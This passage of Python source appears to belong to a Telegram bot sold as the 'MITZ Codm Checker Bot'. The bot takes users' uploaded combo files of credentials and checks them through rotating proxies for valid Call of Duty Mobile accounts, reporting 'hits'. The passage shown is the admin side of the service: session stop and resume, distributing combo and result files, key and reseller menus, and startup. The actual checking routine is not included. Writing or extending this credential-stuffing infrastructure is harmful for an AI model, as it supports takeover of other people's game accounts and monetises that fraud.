        ls2=s.get("live_stats"); st=ls2.get_stats() if ls2 else {}
        lines.append(f"{vip_tag} <b>{fname_u}</b> @{uname} — <code>{combo}</code> hits:{st.get('has_codm',0)}")
        btns.append([InlineKeyboardButton(f" Stop {fname_u} (@{uname})",callback_data=f"admstop_uid_{uid2}")])
    await update.message.reply_text(
        "\n".join(lines), reply_markup=InlineKeyboardMarkup(btns), parse_mode=ParseMode.HTML)

@admin_only
async def cmd_stop_for_vip(update,context):
    """Stop all VIP sessions."""
    await _adm_stop_by_filter(update.message, context.bot, "vip")

@admin_only
async def cmd_stop_nonvip(update,context):
    """Stop all non-VIP sessions."""
    await _adm_stop_by_filter(update.message, context.bot, "nonvip")

# ── Shared stop/continue helpers ──────────────────────────────────────────
async def _adm_stop_by_filter(target_msg, bot, mode):
    users_db=load_users(); stopped=0; loop=asyncio.get_event_loop()
    with sessions_lock:
        for uid2,s in list(active_sessions.items()):
            if s.get("status")!="checking": continue
            is_vip=users_db.get(uid2,{}).get("vip",False)
            match=(mode=="all") or (mode=="vip" and is_vip) or (mode=="nonvip" and not is_vip) or (mode==f"uid:{uid2}")
            if not match: continue
            s["stop_event"].set()
            s["status"]="stopped_by_admin"
            stopped+=1
            cid2=s.get("chat_id")
            uname2=users_db.get(uid2,{}).get("username","?")
            if cid2:
                try:
                    asyncio.run_coroutine_threadsafe(
                        bot.send_message(chat_id=cid2,parse_mode=ParseMode.HTML,
                            text=" <b>Checking stopped by admin.</b>\n"
                                 "Your file is safe. Admin can resume your session anytime."),loop)
                except: pass
    label={"all":"All","vip":"VIP","nonvip":"Non-VIP"}.get(mode, mode.replace("uid:","User "))
    await target_msg.reply_text(
        f" <b>Stopped ({label})</b>\n<code>{stopped}</code> session(s) stopped.\n"
        f"Use /continuechecking to resume.",
        parse_mode=ParseMode.HTML)

async def _adm_continue_by_filter(query, bot, mode):
    users_db=load_users(); resumed=0; loop=asyncio.get_event_loop()
    with sessions_lock:
        targets=[(uid2,dict(s)) for uid2,s in active_sessions.items()
                 if s.get("status")=="stopped_by_admin"
                 and s.get("file") and Path(s["file"]).exists()]
    for uid2,snap in targets:
        is_vip=users_db.get(uid2,{}).get("vip",False)
        match=(mode=="all") or (mode=="vip" and is_vip) or (mode=="nonvip" and not is_vip) or (mode==f"uid:{uid2}")
        if not match: continue
        new_stop=threading.Event()
        with sessions_lock:
            if uid2 not in active_sessions: continue
            active_sessions[uid2]["stop_event"]=new_stop
            active_sessions[uid2]["status"]="checking"
        cid2=snap.get("chat_id"); fpath=snap.get("file","")
        cfg2=load_config()
        lk=snap.get("lvl_key","lvl_all"); ck=snap.get("cf_key","cf_both")
        lim2=cfg2.get("vip_limit") if is_vip else cfg2.get("global_limit")
        ll2=LEVEL_OPTIONS.get(lk,LEVEL_OPTIONS["lvl_all"])
        cl2=CLEAN_OPTIONS.get(ck,CLEAN_OPTIONS["cf_both"])
        rf2=Path(snap.get("result_folder",str(RESULTS_DIR/uid2/datetime.now().strftime("%Y%m%d_%H%M%S"))))
        rf2.mkdir(parents=True,exist_ok=True)
        ts2=datetime.now().strftime("%Y%m%d_%H%M%S")
        try:
            with open(fpath,"r",encoding="utf-8",errors="ignore") as _f:
                rem2=sum(1 for ln in _f if ln.strip() and not ln.strip().startswith("==="))
        except: rem2=0
        disp2=min(lim2,rem2) if lim2 else rem2
        if cid2:
            try:
                asyncio.run_coroutine_threadsafe(
                    bot.send_message(chat_id=cid2,parse_mode=ParseMode.HTML,
                        text=" <b>Checking resumed by admin!</b>\n Hits will be sent here live."),loop)
            except: pass
        persist_session(uid2,{
            "file":fpath,"chat_id":cid2,"lvl_key":lk,"cf_key":ck,
            "username":users_db.get(uid2,{}).get("username",""),
            "first_name":users_db.get(uid2,{}).get("first_name",""),
            "status":"checking","result_folder":str(rf2),"orig_total":disp2,
        })
        def _make_cont_bg(u,fp,rf_p,lim_n,ll_o,cl_o,nstop,cid_n,disp_n,ts_n,cfg_n):
            def _bg():
                _enqueue(u); pos=_queue_pos(u)
                if pos>1:
                    asyncio.run_coroutine_threadsafe(
                        bot.send_message(chat_id=cid_n,parse_mode=ParseMode.HTML,
                            text=f" Queue #{pos}. Waiting…"),loop)
                _checker_semaphore.acquire(); _dequeue(u)
                with sessions_lock:
                    if active_sessions.get(u,{}).get("status")!="checking":
                        _checker_semaphore.release(); return
                fin=run_checker(u,fp,rf_p,lim_n,ll_o["threshold"],nstop,
                                cfg_n["bot_token"],cf_filter=cl_o["filter"],
                                result_folder=rf_p,chat_id=cid_n,loop=loop)
                _checker_semaphore.release()
                with sessions_lock:
                    if u in active_sessions:
                        active_sessions[u]["status"]="done"
                        try:
                            _ls=active_sessions[u].get("live_stats")
                            _ps3=active_sessions[u].get("prev_stats",{})
                            _pp3=active_sessions[u].get("prev_processed",0)
                            _cs3=_ls.get_stats() if _ls else (fin or {})
                            _fs3=dict(_cs3)
                            if _ps3:
                                for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                    _fs3[_k]=_cs3.get(_k,0)+_ps3.get(_k,0)
                            _fs3["total"]=_pp3+_cs3.get("total",0)
                            active_sessions[u]["final_stats"]=_fs3
                        except: pass
                zo=rf_p/f"results_{u}_{ts_n}.zip"; zp=zip_results(rf_p,zo)
                asyncio.run_coroutine_threadsafe(
                    deliver_results(bot,cid_n,u,zp,fin or {},combo_file=fp),loop)
                clear_persisted_session(u)
                with sessions_lock:
                    if u in active_sessions: del active_sessions[u]
            return _bg
        t2=threading.Thread(
            target=_make_cont_bg(uid2,fpath,rf2,lim2,ll2,cl2,new_stop,cid2,disp2,ts2,cfg2),
            daemon=True,name=f"checker-{uid2}")
        t2.start()
        resumed+=1
    label={"all":"All","vip":"VIP","nonvip":"Non-VIP"}.get(mode,mode.replace("uid:","User "))
    await query.edit_message_text(
        f" <b>Resumed ({label})</b>\n<code>{resumed}</code> session(s) restarted.",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('refreshcombo')
async def cmd_refresh_combo(update,context):
    """Send each user their own combo file back, stop checking, delete, then auto-resume."""
    import shutil
    users_db2=load_users()
    loop=asyncio.get_event_loop()
    msg=await update.message.reply_text(" Sending combo files back to users then deleting…",parse_mode=ParseMode.HTML)
    sent_count=0; del_count=0; resume_count=0
    for uid_dir in sorted(COMBO_DIR.iterdir()):
        if not uid_dir.is_dir(): continue
        files=list(uid_dir.glob("*.txt"))
        if not files: continue
        uid2=uid_dir.name
        udata=users_db2.get(uid2,{}); uname2=udata.get("username","?"); fname2=udata.get("first_name","?")
        with sessions_lock: sess2=dict(active_sessions.get(uid2,{}))
        cid2=sess2.get("chat_id")
        if not cid2:
            try:
                import json as _json
                ps=_json.loads(SESSIONS_FILE.read_text()) if SESSIONS_FILE.exists() else {}
                cid2=ps.get(uid2,{}).get("chat_id")
            except: pass
        is_checking=sess2.get("status")=="checking"
        if cid2:
            for f in files:
                try:
                    with open(f,"rb") as fh:
                        await context.bot.send_document(
                            chat_id=int(cid2),
                            document=fh,
                            filename=f.name,
                            caption=" <b>Your combo file — saved before reset by admin.</b>",
                            parse_mode=ParseMode.HTML)
                    sent_count+=1
                except: pass
        if is_checking:
            with sessions_lock:
                active_sessions.get(uid2,{}).get("stop_event",threading.Event()).set()
        uid_combo_dir = files[0].parent if files else None
        for f in files:
            try: f.unlink(); del_count+=1
            except: pass
        if uid_combo_dir and uid_combo_dir.exists() and uid_combo_dir != COMBO_DIR:
            try:
                if not any(uid_combo_dir.iterdir()): uid_combo_dir.rmdir()
            except: pass
        clear_persisted_session(uid2)
        with sessions_lock:
            if uid2 in active_sessions:
                del active_sessions[uid2]
        if cid2:
            try:
                await context.bot.send_message(
                    chat_id=int(cid2),
                    parse_mode=ParseMode.HTML,
                    text=" <b>Admin cleared your combo file.</b>\nYour file was sent back to you above.\nUpload a new file to continue checking.")
            except: pass
        if is_checking: resume_count+=1
    await msg.edit_text(
        f" <b>Combo Refresh Done!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Sent to users : <code>{sent_count}</code> file(s)\n"
        f" Deleted       : <code>{del_count}</code> file(s)\n"
        f" Stopped       : <code>{resume_count}</code> active session(s)",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('refreshresults')
async def cmd_refresh_results(update,context):
    """Send each user their results as zip, delete result folders, auto-resume if still checking."""
    import shutil
    users_db3=load_users()
    loop=asyncio.get_event_loop()
    msg=await update.message.reply_text(" Sending results to users then deleting…",parse_mode=ParseMode.HTML)
    sent_count=0; del_count=0; resumed=0
    for uid_dir in sorted(RESULTS_DIR.iterdir()):
        if not uid_dir.is_dir(): continue
        all_files=[f for f in uid_dir.rglob("*") if f.is_file() and not f.name.endswith(".zip")]
        zips=list(uid_dir.glob("*.zip"))
        if not all_files and not zips: continue
        uid3=uid_dir.name
        udata3=users_db3.get(uid3,{}); uname3=udata3.get("username","?"); fname3=udata3.get("first_name","?")
        with sessions_lock: sess3=dict(active_sessions.get(uid3,{}))
        cid3=sess3.get("chat_id")
        if not cid3:
            try:
                import json as _j2
                ps2=_j2.loads(SESSIONS_FILE.read_text()) if SESSIONS_FILE.exists() else {}
                cid3=ps2.get(uid3,{}).get("chat_id")
            except: pass
        is_checking3=sess3.get("status")=="checking"
        active_rf3=sess3.get("result_folder","")
        ls3=sess3.get("live_stats")
        snap3=ls3.get_stats() if ls3 else {}
        files_to_zip=[]
        for f in all_files+zips:
            if active_rf3 and str(f).startswith(active_rf3): continue
            files_to_zip.append(f)
        if files_to_zip and cid3:
            try:
                ts3=datetime.now().strftime("%Y%m%d_%H%M%S")
                bzip3=uid_dir/f"results_{uid3}_{ts3}.zip"
                with zipfile.ZipFile(bzip3,"w",zipfile.ZIP_DEFLATED) as zf:
                    for rf3 in files_to_zip:
                        try: zf.write(rf3,rf3.relative_to(uid_dir))
                        except: pass
                with open(bzip3,"rb") as fh:
                    await context.bot.send_document(
                        chat_id=int(cid3),
                        document=fh,
                        filename=bzip3.name,
                        caption=(f" <b>Your results</b> — sent by admin\n"
                                 f" {snap3.get('valid',0)}   {snap3.get('has_codm',0)}  "
                                 f" {snap3.get('clean',0)}"),
                        parse_mode=ParseMode.HTML)
                sent_count+=1
                bzip3.unlink()
            except Exception as e:
                log.warning(f"refreshresults send failed for {uid3}: {e}")
        for sub in sorted(uid_dir.iterdir()):
            if not sub.is_dir(): continue
            if active_rf3 and str(sub)==active_rf3: continue
            try: del_result_folder(sub); del_count+=1
            except: pass
        if not is_checking3:
            try:
                if uid_dir.exists() and not any(uid_dir.iterdir()):
                    uid_dir.rmdir()
            except: pass
        if not is_checking3:
            with sessions_lock:
                if uid3 in active_sessions:
                    active_sessions[uid3].pop("result_folder",None)
        if is_checking3:
            resumed+=1
            if cid3:
                try:
                    await context.bot.send_message(
                        chat_id=int(cid3),
                        parse_mode=ParseMode.HTML,
                        text=" <b>Your current results were sent above.</b>\nChecking continues — new results will come when done.")
                except: pass
    await msg.edit_text(
        f" <b>Results Refresh Done!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Sent to users  : <code>{sent_count}</code> result zip(s)\n"
        f" Deleted old    : <code>{del_count}</code> folder(s)\n"
        f" Still checking : <code>{resumed}</code> session(s) untouched",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('checkrunning')
async def cmd_check_running(update,context):
    """Show all users currently running a checker."""
    with sessions_lock:
        running=[(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    if not running:
        await update.message.reply_text(" No active checking sessions.",parse_mode=ParseMode.HTML); return
    users_db=load_users()
    lines=[f" <b>Running Sessions ({len(running)})</b>\n━━━━━━━━━━━━━━━━━━━━"]
    for uid2,s in running:
        udata=users_db.get(uid2,{}); uname=udata.get("username","?"); fname=udata.get("first_name","?")
        combo=Path(s.get("file","")).name if s.get("file") else "N/A"
        lk=s.get("lvl_key","lvl_all"); ck=s.get("cf_key","cf_both")
        ll=LEVEL_OPTIONS.get(lk,LEVEL_OPTIONS["lvl_all"])["label"]
        cl=CLEAN_OPTIONS.get(ck,CLEAN_OPTIONS["cf_both"])["label"]
        ls2=s.get("live_stats")
        st=ls2.get_stats() if ls2 else {}
        try:
            with open(s["file"],"r",encoding="utf-8",errors="ignore") as _f:
                rem=sum(1 for ln in _f if ln.strip() and not ln.strip().startswith("==="))
        except: rem=0
        orig=s.get("orig_total",0)
        done_n=st.get("total",0)
        pct=int(done_n/orig*100) if orig else 0
        lines.append(
            f"\n <b>{fname}</b> @{uname} (<code>{uid2}</code>)\n"
            f" {combo}\n"
            f" {ll}   {cl}\n"
            f" {done_n:,}/{orig:,} ({pct}%)   Valid:{st.get('valid',0)}   CODM:{st.get('has_codm',0)}")
    await update.message.reply_text("\n".join(lines),parse_mode=ParseMode.HTML)

# ── Admin panel helpers ──────────────────────────────────────────────────
def _admin_main_kb(cfg, context=None):
    locked = cfg.get("locked", False)
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(" Keys", callback_data="adm_keys"),
         InlineKeyboardButton(" Users", callback_data="adm_users")],
        [InlineKeyboardButton(" Proxy", callback_data="adm_proxy"),
         InlineKeyboardButton(" Settings", callback_data="adm_settings")],
        [InlineKeyboardButton(" Files", callback_data="adm_files"),
         InlineKeyboardButton(" Stats", callback_data="adm_stats")],
        [InlineKeyboardButton(" Lock Bot" if not locked else " Unlock Bot",
                              callback_data="adm_toggle_lock"),
         InlineKeyboardButton(" Refresh", callback_data="adm_refresh")],
        [InlineKeyboardButton(" Running Now", callback_data="adm_running")],
    ])

def _admin_status_text(cfg, users):
    ac  = sum(1 for u in users.values() if u.get("activated"))
    bc  = sum(1 for u in users.values() if u.get("banned"))
    vc  = sum(1 for u in users.values() if u.get("vip"))
    with sessions_lock:
        live = sum(1 for s in active_sessions.values() if s.get("status")=="checking")
    lock_s = " ON" if cfg.get("locked") else " OFF"
    return (f"{pe(3)} <b>Admin Panel</b> — MITZ Codm Checker Bot {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Users   : <code>{len(users)}</code>  {ac}  {bc}  {vc}\n"
            f"{pe(2)} Live    : <code>{live}/{MAX_CONCURRENT_CHECKERS}</code> slots {pe(2)}\n"
            f"{pe(2)} Lock    : {lock_s} {pe(2)}\n"
            f"{pe(1)} Limit   : <code>{cfg.get('global_limit') or 'Unlimited'}</code>  "
            f"<code>{cfg.get('vip_limit') or 'Unlimited'}</code>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Choose a section:")

def _admin_keys_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(" Hours Key",     callback_data="adm_genkey_hours"),
         InlineKeyboardButton(" Days Key",      callback_data="adm_genkey_days")],
        [InlineKeyboardButton(" Months Key",    callback_data="adm_genkey_months"),
         InlineKeyboardButton(" Lifetime Key",  callback_data="adm_genkey_lifetime")],
        [InlineKeyboardButton(" Remove All",    callback_data="adm_rmkey_all"),
         InlineKeyboardButton(" Remove VIP",    callback_data="adm_rmkey_vip")],
        [InlineKeyboardButton(" Remove Non-VIP",callback_data="adm_rmkey_nonvip")],
        [InlineKeyboardButton("« Back",           callback_data="adm_back")],
    ])

def _admin_users_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(" Add VIP",       callback_data="adm_ask_addvip"),
         InlineKeyboardButton(" Remove VIP",    callback_data="adm_ask_rmvip")],
        [InlineKeyboardButton(" Ban User",      callback_data="adm_ask_ban"),
         InlineKeyboardButton(" Unban User",    callback_data="adm_ask_unban")],
        [InlineKeyboardButton(" All Users",     callback_data="adm_allusers"),
         InlineKeyboardButton(" Running",       callback_data="adm_running")],
        [InlineKeyboardButton(" Broadcast",     callback_data="adm_ask_broadcast")],
        [InlineKeyboardButton("« Back",           callback_data="adm_back")],
    ])

def _admin_proxy_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(" Upload File",   callback_data="adm_upload_proxy"),
         InlineKeyboardButton(" Status",        callback_data="adm_proxy_status")],
        [InlineKeyboardButton(" Remove Files",  callback_data="adm_remove_proxy"),
         InlineKeyboardButton(" Paste Proxies", callback_data="adm_paste_proxy")],
        [InlineKeyboardButton(" Reload Rotator",callback_data="adm_reload_proxy")],
        [InlineKeyboardButton(" Clean ALL Files (remove dead/errors)",
                              callback_data="chkprx_rmdeadlines_ALL_")],
        [InlineKeyboardButton("« Back",           callback_data="adm_back")],
    ])

def _admin_settings_kb(cfg):
    locked=cfg.get("locked",False)
    lock_lbl=" Unlock Bot" if locked else " Lock Bot"
    lock_cb ="adm_toggle_lock"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(lock_lbl,           callback_data=lock_cb)],
        [InlineKeyboardButton(" Set Limit",     callback_data="adm_ask_limit"),
         InlineKeyboardButton(" VIP Limit",     callback_data="adm_ask_viplimit")],
        [InlineKeyboardButton(" Cooldown",      callback_data="adm_ask_cooldown"),
         InlineKeyboardButton(" Threads",       callback_data="adm_ask_threads")],
        [InlineKeyboardButton(" Concurrent",    callback_data="adm_ask_concurrent"),
         InlineKeyboardButton(" Reload Config", callback_data="adm_do_refresh")],
        [InlineKeyboardButton("« Back",           callback_data="adm_back")],
    ])

def _admin_files_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(" Clear Combos",         callback_data="adm_ask_refreshcombo"),
         InlineKeyboardButton(" Clear Results",        callback_data="adm_ask_refreshresults")],
        [InlineKeyboardButton("« Back",                  callback_data="adm_back")],
    ])

async def _adm_edit(query, text, kb=None):
    try: await query.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
    except: pass

async def cmd_admin_panel(update,context):
    cfg=load_config(); users=load_users()
    text=_admin_status_text(cfg,users)
    kb=_admin_main_kb(cfg)
    if update.message:
        await update.message.reply_text(text,reply_markup=kb,parse_mode=ParseMode.HTML)
    elif update.callback_query:
        try:
            await update.callback_query.edit_message_text(text,reply_markup=kb,parse_mode=ParseMode.HTML)
        except:
            await update.callback_query.message.reply_text(text,reply_markup=kb,parse_mode=ParseMode.HTML)

async def _set_bot_commands(app):
    cfg = load_config()
    user_cmds = [
        BotCommand("start",          " Start / Home"),
        BotCommand("redeem",         " Redeem a key"),
        BotCommand("check",          " Check progress"),
        BotCommand("stop",           " Stop checking"),
        BotCommand("status",         "ℹ Session status"),
        BotCommand("myresultsfile",  " Get current results file"),
        BotCommand("deletefile",     " Delete your combo file"),
        BotCommand("clean",          " Clean combo file"),
        BotCommand("cancel",         " Cancel session"),
        BotCommand("hitson",         " Enable hit notifications"),
        BotCommand("hitsoff",        " Disable hit notifications"),
    ]
    admin_cmds = user_cmds + [
        BotCommand("admin",          " Admin panel"),
        BotCommand("generate_key",   " Generate a key"),
        BotCommand("remove_key",     " Remove key(s)"),
        BotCommand("ban_user",       " Ban a user"),
        BotCommand("unban_user",     " Unban a user"),
        BotCommand("addvip",         " Add VIP"),
        BotCommand("removevip",      " Remove VIP"),
        BotCommand("lockall",        " Lock bot"),
        BotCommand("unlockall",      " Unlock bot"),
        BotCommand("stats",          " Bot statistics"),
        BotCommand("checkalluser",   " List all users"),
        BotCommand("checkrunning",   " Who is running"),
        BotCommand("stopchecking",   " Stop checking sessions"),
        BotCommand("continuechecking"," Continue stopped sessions"),
        BotCommand("stopforuser",    " Stop one user"),
        BotCommand("stopforvip",     " Stop VIP sessions"),
        BotCommand("stopnonvip",     " Stop non-VIP sessions"),
        BotCommand("broadcast",      " Broadcast message"),
        BotCommand("checkproxy",    " Check proxy file"),
        BotCommand("pasteproxy",    " Paste proxy lines"),
        BotCommand("upload_proxy",   " Upload proxy file"),
        BotCommand("proxystatus",    " Proxy file status"),
        BotCommand("removeproxy",    " Remove proxy file"),
        BotCommand("pasteproxy",     " Paste proxy lines"),
        BotCommand("checkproxy",     " Check proxy file"),
        BotCommand("reloadbot",      " Restart bot"),
        BotCommand("refreshcombo",   " Clear all combo files"),
        BotCommand("refreshresults", " Clear all results"),
        BotCommand("setlimit",       " Set line limit"),
        BotCommand("setlimitforvip", " Set VIP limit"),
        BotCommand("setcd",          " Set cooldown"),
        BotCommand("setconcurrent",  " Set concurrent slots"),
        BotCommand("refresh",        " Reload config & proxy"),
        BotCommand("setcommands",    " Refresh command menu"),
        BotCommand("reloadbot",      " Fully restart bot process"),
        BotCommand("senddata",       " Send data files"),
        BotCommand("replacefile",    " Replace a data file"),
        BotCommand("stopall",        " Stop all sessions"),
        BotCommand("continueall",    " Continue all stopped"),
        BotCommand("stopforvip",     " Stop all VIP sessions"),
        BotCommand("stopfornonvip",  " Stop all non-VIP sessions"),
        BotCommand("stopforuser",    " Stop/manage one user"),
        BotCommand("miniadminpanel",      " Add/manage mini admin"),
        BotCommand("removeminiadmin",     " Remove mini admin"),
        BotCommand("miniadminlist",       " List all mini admins"),
        BotCommand("miniadmininfo",       " Mini admin activity log"),
    ]
    reseller_cmds = [
        BotCommand("start",          " Start / Home"),
        BotCommand("redeem",         " Redeem a key"),
        BotCommand("check",          " Check progress"),
        BotCommand("stop",           " Stop checking"),
        BotCommand("status",         "ℹ Session status"),
        BotCommand("myresultsfile",  " Get current results file"),
        BotCommand("deletefile",     " Delete your combo file"),
        BotCommand("clean",          " Clean combo file"),
        BotCommand("cancel",         " Cancel session"),
        BotCommand("hitson",         " Enable hit notifications"),
        BotCommand("hitsoff",        " Disable hit notifications"),
        BotCommand("miniadminpanel", " Mini Admin panel"),
        BotCommand("rgenkey",        " Generate a key"),
    ]
    try:
        await app.bot.set_my_commands(user_cmds)
        await app.bot.set_my_commands(user_cmds, scope=BotCommandScopeAllPrivateChats())
        for admin_id in cfg.get("admin_ids", []):
            try:
                await app.bot.set_my_commands(admin_cmds, scope=BotCommandScopeChat(chat_id=int(admin_id)))
            except Exception as e:
                log.warning(f"Could not set admin commands for {admin_id}: {e}")
        rs_db = load_resellers()
        for rs_uid, rd in rs_db.items():
            if not rd.get("active"): continue
            try:
                await app.bot.set_my_commands(reseller_cmds, scope=BotCommandScopeChat(chat_id=int(rs_uid)))
            except Exception as e:
                log.warning(f"Could not set reseller commands for {rs_uid}: {e}")
    except Exception as e:
        log.warning(f"Could not set bot commands: {e}")

@admin_only
async def cmd_set_commands(update, context):
    """Refresh command menu."""
    msg = await update.message.reply_text(" Setting command menus…", parse_mode=ParseMode.HTML)
    cfg = load_config()
    user_cmds2 = [
        BotCommand("start",          " Start / Home"),
        BotCommand("redeem",         " Redeem a key"),
        BotCommand("check",          " Check progress"),
        BotCommand("stop",           " Stop checking"),
        BotCommand("status",         "ℹ Session status"),
        BotCommand("myresultsfile",  " Get current results file"),
        BotCommand("deletefile",     " Delete your combo file"),
        BotCommand("clean",          " Clean combo file"),
        BotCommand("cancel",         " Cancel session"),
        BotCommand("hitson",         " Enable hit notifications"),
        BotCommand("hitsoff",        " Disable hit notifications"),
    ]
    admin_cmds2 = user_cmds2 + [
        BotCommand("admin",          " Admin panel"),
        BotCommand("generate_key",   " Generate a key"),
        BotCommand("remove_key",     " Remove key(s)"),
        BotCommand("ban_user",       " Ban a user"),
        BotCommand("unban_user",     " Unban a user"),
        BotCommand("addvip",         " Add VIP"),
        BotCommand("removevip",      " Remove VIP"),
        BotCommand("lockall",        " Lock bot"),
        BotCommand("unlockall",      " Unlock bot"),
        BotCommand("stats",          " Bot statistics"),
        BotCommand("checkalluser",   " List all users"),
        BotCommand("checkrunning",   " Who is running"),
        BotCommand("stopchecking",   " Stop checking sessions"),
        BotCommand("continuechecking"," Continue stopped sessions"),
        BotCommand("stopforuser",    " Stop one user"),
        BotCommand("stopforvip",     " Stop VIP sessions"),
        BotCommand("stopnonvip",     " Stop non-VIP sessions"),
        BotCommand("broadcast",      " Broadcast message"),
        BotCommand("checkproxy",    " Check proxy file"),
        BotCommand("pasteproxy",    " Paste proxy lines"),
        BotCommand("upload_proxy",   " Upload proxy file"),
        BotCommand("proxystatus",    " Proxy file status"),
        BotCommand("removeproxy",    " Remove proxy file"),
        BotCommand("pasteproxy",     " Paste proxy lines"),
        BotCommand("checkproxy",     " Check proxy file"),
        BotCommand("reloadbot",      " Restart bot"),
        BotCommand("refreshcombo",   " Clear all combo files"),
        BotCommand("refreshresults", " Clear all results"),
        BotCommand("setlimit",       " Set line limit"),
        BotCommand("setlimitforvip", " Set VIP limit"),
        BotCommand("setcd",          " Set cooldown"),
        BotCommand("setconcurrent",  " Set concurrent slots"),
        BotCommand("refresh",        " Reload config & proxy"),
        BotCommand("setcommands",    " Refresh command menu"),
        BotCommand("reloadbot",      " Fully restart bot process"),
        BotCommand("senddata",       " Send data files"),
        BotCommand("replacefile",    " Replace a data file"),
        BotCommand("stopall",        " Stop all sessions"),
        BotCommand("continueall",    " Continue all stopped"),
        BotCommand("stopforvip",     " Stop all VIP sessions"),
        BotCommand("stopfornonvip",  " Stop all non-VIP sessions"),
        BotCommand("stopforuser",    " Stop/manage one user"),
        BotCommand("miniadminpanel",      " Add/manage mini admin"),
        BotCommand("removeminiadmin",     " Remove mini admin"),
        BotCommand("miniadminlist",       " List all mini admins"),
        BotCommand("miniadmininfo",       " Mini admin activity log"),
    ]
    reseller_cmds2 = [
        BotCommand("start",          " Start / Home"),
        BotCommand("redeem",         " Redeem a key"),
        BotCommand("check",          " Check progress"),
        BotCommand("stop",           " Stop checking"),
        BotCommand("status",         "ℹ Session status"),
        BotCommand("myresultsfile",  " Get current results file"),
        BotCommand("deletefile",     " Delete your combo file"),
        BotCommand("clean",          " Clean combo file"),
        BotCommand("cancel",         " Cancel session"),
        BotCommand("hitson",         " Enable hit notifications"),
        BotCommand("hitsoff",        " Disable hit notifications"),
        BotCommand("resellerpanel",  " Your reseller panel"),
        BotCommand("rgenkey",        " Generate a key"),
    ]
    try:
        await context.bot.set_my_commands(user_cmds2)
        await context.bot.set_my_commands(user_cmds2, scope=BotCommandScopeAllPrivateChats())
        caller_id = int(update.effective_chat.id)
        await context.bot.set_my_commands(admin_cmds2, scope=BotCommandScopeChat(chat_id=caller_id))
        for admin_id in cfg.get("admin_ids", []):
            if int(admin_id) == caller_id: continue
            await context.bot.set_my_commands(admin_cmds2, scope=BotCommandScopeChat(chat_id=int(admin_id)))
        rs_db = load_resellers()
        for rs_uid, rd in rs_db.items():
            if not rd.get("active"): continue
            await context.bot.set_my_commands(reseller_cmds2, scope=BotCommandScopeChat(chat_id=int(rs_uid)))
        text = f" <b>Command menu updated!</b>\n━━━━━━━━━━━━━━━━━━━━\n Your menu now shows all admin commands.\n Users see basic commands only."
    except Exception as e:
        text = f" Failed: <code>{e}</code>"
    await msg.edit_text(text, parse_mode=ParseMode.HTML)
    
@admin_only
async def cmd_replace_file(update, context):
    """/replacefile — ready mode for replacing data files."""
    tg=update.effective_user; uid=str(tg.id)
    REPLACEABLE = {
        "config.json":           CONFIG_FILE,
        "users.json":            USERS_FILE,
        "keys.json":             KEYS_FILE,
        "sessions_persist.json": SESSIONS_FILE,
        "mini_admins.json":      MINI_ADMINS_FILE,
        "resellers.json":        RESELLERS_FILE,
    }
    if not context.args:
        with sessions_lock:
            active_sessions.setdefault(uid,{})
            active_sessions[uid]["awaiting_replace_file"]="__auto__"
            active_sessions[uid]["awaiting_replace_path"]="__auto__"
        file_list="\n".join(f"  • <code>{name}</code>" for name in REPLACEABLE)
        await update.message.reply_text(
            f" <b>Replace File — Ready!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Just send any of these files directly now:\n\n{file_list}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" The filename is auto-detected from what you send.\n"
            f" Current file is backed up as <code>filename.json.bak</code>.",
            parse_mode=ParseMode.HTML)
        return
    fname=context.args[0].strip().lower()
    if not fname.endswith(".json"): fname=fname+".json"
    if fname not in REPLACEABLE:
        valid=", ".join(f"<code>{n.replace('.json','')}</code>" for n in REPLACEABLE)
        await update.message.reply_text(f" Unknown file. Valid: {valid}", parse_mode=ParseMode.HTML)
        return
    target_path=REPLACEABLE[fname]
    with sessions_lock:
        active_sessions.setdefault(uid,{})
        active_sessions[uid]["awaiting_replace_file"]=fname
        active_sessions[uid]["awaiting_replace_path"]=str(target_path)
    await update.message.reply_text(
        f" <b>Ready to Replace</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Target : <code>{fname}</code>\n"
        f" Send your <code>{fname}</code> file now.",
        parse_mode=ParseMode.HTML)

@admin_only
async def cmd_cancel_replace(update, context):
    uid=str(update.effective_user.id)
    with sessions_lock:
        sess=active_sessions.get(uid,{})
        fname=sess.get("awaiting_replace_file")
        if fname:
            active_sessions[uid].pop("awaiting_replace_file",None)
            active_sessions[uid].pop("awaiting_replace_path",None)
            await update.message.reply_text(f" Replacement of <code>{fname}</code> cancelled.", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(" No pending replacement.", parse_mode=ParseMode.HTML)

# ════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════
def main():
    cfg=load_config()
    if cfg["bot_token"]=="YOUR_BOT_TOKEN_HERE":
        print("="*55); print("    Set bot_token  in data/config.json")
        print("    Set admin_ids  in data/config.json"); print("="*55); sys.exit(1)
    saved_mc=cfg.get("max_concurrent",5)
    if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
    if not cfg.get("admin_ids"): print("  No admin_ids set")
    if not CHECKER_OK:           print(f"  Checker unavailable: {CHECKER_ERR}")
    print(f"  Bot starting — @{cfg['channel_username']}  |  Slots: {MAX_CONCURRENT_CHECKERS}")

    app=(Application.builder()
         .token(cfg["bot_token"])
         .read_timeout(30).write_timeout(30)
         .connect_timeout(30).pool_timeout(30)
         .build())

    # ── Crash-resume ──────────────────────────────────────────────────────
    ps=load_persisted_sessions()
    if ps:
        log.info(f" Found {len(ps)} persisted session(s) — auto-resuming")
        async def _auto_resume(application):
            loop2=asyncio.get_event_loop()
            cfg2=load_config()
